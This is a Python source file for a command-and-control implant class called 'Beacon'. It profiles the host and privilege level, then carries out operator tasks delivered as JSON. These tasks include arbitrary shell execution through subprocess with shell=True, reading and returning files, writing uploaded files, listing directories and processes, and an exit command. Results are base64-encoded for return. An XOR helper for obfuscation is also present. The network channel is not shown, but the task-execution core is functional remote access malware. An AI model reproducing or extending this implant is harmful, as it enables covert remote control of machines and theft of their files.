import json 
import base64
import random
import socket
import os 
import platform
import subprocess
# import psutil
from pathlib import Path


def xorEncode(text, key):
    # Initialize an empty string for encrypted text
    encrypted_text = ""
    
    # Iterate over each character in the text
    for i in range(len(text)):
        encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))
    
    # Return the encrypted text
    return encrypted_text


class Beacon:
        
    def __init__(self):
        self.beaconHash = ""
        self.hostname = ""
        self.username = ""
        self.arch = ""
        self.privilege = ""
        self.os = ""
        self.sleepTimeMs = 1000

        self.tasks = []
        self.taskResults = []

        characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        self.beaconHash = ''.join(random.choice(characters) for _ in range(32))
        
        self.hostname = socket.gethostname()
        self.username = "user"
        try:
            self.username = os.getlogin()
        except:
            self.username = subprocess.run(["whoami"], shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE).stdout.decode('utf-8')
        self.arch = platform.machine()
        if self.username == "root":
            self.privilege = "high"
        else:
            self.privilege = "low"
        self.os = platform.system()


    def cmdToTasks(self, input):
        if input.strip() != "":
            jsonNode = json.loads(input)
            for it in jsonNode:
                sessions = it["sessions"]
                for s1 in sessions:
                    self.tasks.append(s1)

    def execInstruction(self):
        for it in self.tasks:
            instruction = ""
            if "instruction" in it:
                instruction = it["instruction"]
            args = ""
            if "args" in it:
                args = it["args"]
            cmd = ""
            if "cmd" in it:
                cmd = it["cmd"]
            data = b""
            if "data" in it:
                data = base64.b64decode(it["data"].encode('utf-8'))
            inputFile = ""
            if "inputFile" in it:
                inputFile = base64.b64decode(it["inputFile"].encode('utf-8')).decode('utf-8')
            outputFile = ""
            if "outputFile" in it:
                outputFile = base64.b64decode(it["outputFile"].encode('utf-8')).decode('utf-8')
            pid = -1
            if "pid" in it:
                pid = it["pid"]

            result = ""
            if instruction == "ls":
                if cmd == "":
                    cmd = "."
                try:
                    dic = os.listdir(cmd)
                    for entry in dic:
                        isFile = "f"
                        if os.path.isfile(cmd+"/"+entry):
                            isFile = "f"
                        elif os.path.isdir(cmd+"/"+entry):
                            isFile = "d"
                        mask = oct(os.stat(cmd+"/"+entry).st_mode)[-3:]
                        path = Path(cmd+"/"+entry)
                        owner = path.owner()
                        group = path.group()
                        result += isFile + mask + " " + owner + " " + group + " " + cmd+"/"+entry
                        result += "\n"
                except:
                    result = "No such file or directory: " + cmd

            elif instruction == "ps":
                result = subprocess.run(["ps -aux"], shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE).stdout.decode('utf-8')
                # try:
                #     # print( list(psutil.Process().as_dict().keys()))
                #     for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
                #         cmdLine = ""
                #         for cmd in proc.info["cmdline"]:
                #             cmdLine += cmd + " "
                #         if cmdLine.strip() == "":  
                #             cmdLine = proc.info["name"]

                #         result += proc.info["username"] + " " + str(proc.info["pid"]) + " " + cmdLine
                #         result += "\n"
                # except:
                #     result = "ps failed"

            elif instruction == "cd":
                os.chdir(cmd)
                result = os.getcwd()

            elif instruction == "pwd":
                result = os.getcwd()

            elif instruction == "cat":
                if os.path.isfile(inputFile):
                    f = open(inputFile, "rb")
                    data = f.read()
                    f.close()
                    result = data.decode('utf-8')

            elif instruction == "download":
                if os.path.isfile(inputFile):
                    try:
                        f = open(inputFile, "rb")
                        data = f.read()
                        f.close()
                        result = "File downloaded"
                    except:
                        result = "Download failed"
                else:
                    result = "Download failed"

            elif instruction == "upload": 
                try:
                    f = open(outputFile, "wb")
                    f.write(data)
                    f.close()
                    result = "File uploaded."
                except:
                    result = "Upload failed."

            elif instruction == "run":
                result = subprocess.run([cmd], shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE).stdout.decode('utf-8')
                if not result:
                    result="Empty response."

            elif instruction == "sleep":
                self.sleepTimeMs=int(cmd)*1000

            elif instruction == "end":
                exit(0)

            else: 
                result = "cmd unknown."

            taskResult = {
                "args":args,
                "cmd":cmd,
                "data":base64.b64encode(data).decode('utf-8'),
                "inputFile":base64.b64encode(inputFile.encode('utf-8')).decode('utf-8'),
                "instruction":instruction,
                "outputFile":base64.b64encode(outputFile.encode('utf-8')).decode('utf-8'),
                "pid":pid,
                "returnValue":base64.b64encode(result.encode('utf-8')).decode('utf-8')
                }
            self.taskResults.append(taskResult)

        # cleaning
        self.tasks.clear()
